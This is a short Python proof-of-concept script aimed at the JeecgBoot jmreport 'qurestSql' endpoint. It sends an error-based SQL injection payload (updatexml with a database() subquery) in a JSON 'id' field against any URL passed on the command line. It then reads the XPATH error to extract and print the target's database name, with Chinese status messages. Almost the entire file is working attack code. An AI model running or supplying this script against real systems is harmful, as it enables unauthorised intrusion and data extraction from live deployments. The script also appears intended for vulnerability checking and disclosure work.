#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import sys
import requests
import re
import urllib
import urllib3

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/jeecg-boot/jmreport/qurestSql"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:71.0) Gecko/20100101 Firefox/71.0", "Connection": "close", "Content-Type": "application/json;charset=UTF-8", "Accept-Encoding": "gzip"}
    burp0_json={"apiSelectId": "1316997232402231298", "id": "1' or '%1%' like (updatexml(0x3a,concat(1,(select database())),1)) or '%%' like '"}
    resp = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
    if "XPATH" in resp.text:
        return re.findall("XPATH syntax error: '([^']+)'", resp.text, re.I)[0]
    return ""
    
    
if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Winows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 jeecgboot-jmreport-qurestSql-sqli.py ",target)
    data = verify(target)
    if data:
        print("[+]漏洞存在，当前数据库名称为：", data)
    else:
        print("[-]漏洞不存在")
